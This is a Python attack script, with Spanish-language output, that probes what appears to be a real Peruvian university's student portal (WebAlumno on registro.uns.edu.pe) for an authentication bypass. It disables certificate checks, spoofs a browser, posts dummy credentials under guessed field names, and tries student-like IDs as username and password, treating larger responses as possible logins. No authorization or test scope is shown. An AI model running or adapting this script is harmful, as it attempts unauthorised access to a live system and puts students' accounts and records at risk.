#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
    'Content-Type': 'application/x-www-form-urlencoded',
})

# Step 1: Get the WebAlumno login page
print("=== WEBALUMINO - PRUEBAS DE AUTH BYPASS ===")
r = s.get('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml', timeout=10)
print(f"Login page: HTTP {r.status_code}, len={len(r.text)}")

# Find form inputs and actions
forms = re.findall(r'<form[^>]*action="([^"]+)"[^>]*>', r.text)
inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*type="([^"]+)"', r.text)
print(f"Forms: {forms}")
print(f"Inputs: {inputs[:10]}")

# Find all input fields
all_inputs = re.findall(r'<input[^>]*>', r.text)
for inp in all_inputs[:15]:
    print(f"  Input: {inp[:150]}")

# Step 2: Try auth bypass with different field names
print("\n=== INTENTANDO LOGIN CON CREDENCIALES ===")

# Try different possible form field names for WebAlumno
credential_pairs = [
    ('j_username', 'j_password'),
    ('username', 'password'),
    ('user', 'pass'),
    ('usuario', 'contrasena'),
    ('codigo', 'clave'),
    ('login', 'pass'),
    ('email', 'password'),
]

for user_field, pass_field in credential_pairs:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'})
    r2 = s2.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                   data={user_field: 'fake', pass_field: 'fake'},
                   timeout=5, allow_redirects=True)
    if len(r2.text) > len(r.text) or 'No records' not in r2.text.lower():
        if 'login' not in r2.text.lower() or 'j_username' not in r2.text.lower():
            print(f"  {user_field}/{pass_field} -> Posible bypass! len={len(r2.text)}")
        else:
            print(f"  {user_field}/{pass_field} -> Login page again")
    else:
        print(f"  {user_field}/{pass_field} -> {r2.status_code}, len={len(r2.text)}")

# Step 3: Try with actual student-like IDs
print("\n=== PROBANDO CON IDS DE ESTUDIANTES ===")
for uid in ['2024001', '2023001', '2022001', '12345']:
    s3 = requests.Session()
    s3.verify = False
    s3.headers.update({'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'})
    r3 = s3.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                   data={'j_username': uid, 'j_password': uid},
                   timeout=5, allow_redirects=True)
    print(f"  {uid}/{uid} -> {r3.status_code}, len={len(r3.text)}")
    if len(r3.text) > 17320:
        print(f"    [!] TAMANO AUMENTO - PODRIA SER EXITOSO")

# Step 4: Check what the actual error page says
print("\n=== CONTENIDO COMPLETO DE LOGIN PAGE ===")
# Remove HTML tags to see text
text_clean = re.sub(r'<[^>]+>', ' ', r.text)
text_clean = re.sub(r'\s+', ' ', text_clean).strip()
print(f"  {text_clean[:500]}")

# Check for any error or redirect messages
print("\n=== BUSCANDO MENSAJES ===")
error_patterns = ['error', 'redirect', 'bienvenido', 'login', 'acceso', 'autentic']
for pat in error_patterns:
    matches = list(re.finditer(pat, r.text, re.IGNORECASE))
    for m in matches[:3]:
        ctx = r.text[max(0,m.start()-30):m.end()+80]
        ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
        ctx_clean = re.sub(r'\s+', ' ', ctx_clean).strip()
        print(f"  [{pat}]: {ctx_clean}")

# Step 5: Check if WebAlumno has security headers
print("\n=== HEADERS DE WEBALUMINO ===")
for k, v in r.headers.items():
    print(f"  {k}: {v}")

# Step 6: Try accessing WebAlumno with port 443 (standard HTTPS)
print("\n=== CON PUERTO ESTANDAR ===")
r4 = s.get('https://registro.uns.edu.pe/WebAlumno/faces/login.xhtml', timeout=10)
print(f"Status: {r4.status_code}, len={len(r4.text)}")
